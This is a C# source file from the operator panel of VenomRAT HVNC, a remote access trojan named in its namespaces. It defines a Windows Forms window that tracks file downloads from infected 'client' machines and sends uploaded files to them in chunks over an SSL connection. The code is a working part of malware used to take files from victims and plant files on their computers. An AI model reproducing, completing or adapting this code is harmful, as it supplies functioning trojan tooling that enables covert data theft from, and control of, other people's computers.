using System;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using Server;
using VenomRAT_HVNC.Server.Connection;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server.Forms
{
    public partial class FormDownloadFile : Form
    {
        public Form1 F { get; set; }

        internal Clients Client { get; set; }

        public FormDownloadFile()
        {
            this.InitializeComponent();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (this.FileSize >= 2147483647L)
            {
                this.timer1.Stop();
                MessageBox.Show("Don't support files larger than 2GB.");
                base.Dispose();
                return;
            }
            if (!this.IsUpload)
            {
                this.labelsize.Text = Methods.BytesToString(this.FileSize) + " \\ " + Methods.BytesToString(this.Client.BytesRecevied);
                if (this.Client.BytesRecevied >= this.FileSize)
                {
                    this.labelsize.Text = "Downloaded";
                    this.labelsize.ForeColor = Color.Green;
                    this.timer1.Stop();
                    return;
                }
            }
            else
            {
                this.labelsize.Text = Methods.BytesToString(this.FileSize) + " \\ " + Methods.BytesToString(this.BytesSent);
                if (this.BytesSent >= this.FileSize)
                {
                    this.labelsize.Text = "Uploaded";
                    this.labelsize.ForeColor = Color.Green;
                    this.timer1.Stop();
                }
            }
        }

        private void SocketDownload_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                Clients client = this.Client;
                if (client != null)
                {
                    client.Disconnected();
                }
                Timer timer = this.timer1;
                if (timer != null)
                {
                    timer.Dispose();
                }
            }
            catch
            {
            }
        }

        public void Send(object obj)
        {
            object sendSync = this.Client.SendSync;
            lock (sendSync)
            {
                try
                {
                    this.IsUpload = true;
                    byte[] array = (byte[])obj;
                    byte[] bytes = BitConverter.GetBytes(array.Length);
                    this.Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
                    this.Client.SslClient.Write(bytes, 0, bytes.Length);
                    using (MemoryStream memoryStream = new MemoryStream(array))
                    {
                        memoryStream.Position = 0L;
                        byte[] array2 = new byte[50000];
                        int num;
                        while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
                        {
                            this.Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
                            this.Client.SslClient.Write(array2, 0, num);
                            this.BytesSent += (long)num;
                        }
                    }
                    Program.form1.BeginInvoke(new MethodInvoker(delegate ()
                    {
                        base.Close();
                    }));
                }
                catch
                {
                    Clients client = this.Client;
                    if (client != null)
                    {
                        client.Disconnected();
                    }
                    Program.form1.BeginInvoke(new MethodInvoker(delegate ()
                    {
                        this.labelsize.Text = "Error";
                        this.labelsize.ForeColor = Color.Red;
                    }));
                }
            }
        }

        public long FileSize;

        private long BytesSent;

        public string FullFileName;

        public string ClientFullFileName;

        private bool IsUpload;

        public string DirPath;
    }
}
